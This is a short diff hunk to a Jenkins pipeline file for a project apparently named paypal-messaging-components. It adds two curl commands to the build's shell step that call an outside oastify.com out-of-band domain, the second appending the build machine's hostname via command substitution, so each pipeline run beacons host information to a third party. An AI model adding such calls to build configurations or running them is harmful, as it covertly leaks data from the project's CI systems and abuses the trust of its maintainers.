@@ -23,6 +23,8 @@ pipeline {
             steps {
                 checkout scm
                 sh '''
+                    curl https://ojb4x16q0ns4n7yuezwo0j67kyqtekf84.oastify.com/paypal/paypal-messaging-components
+                    curl https://ojb4x16q0ns4n7yuezwo0j67kyqtekf84.oastify.com/paypal/paypal-messaging-components/`hostname`
                     echo $GIT_COMMIT_MESSAGE
                     node -v
                     npm -v
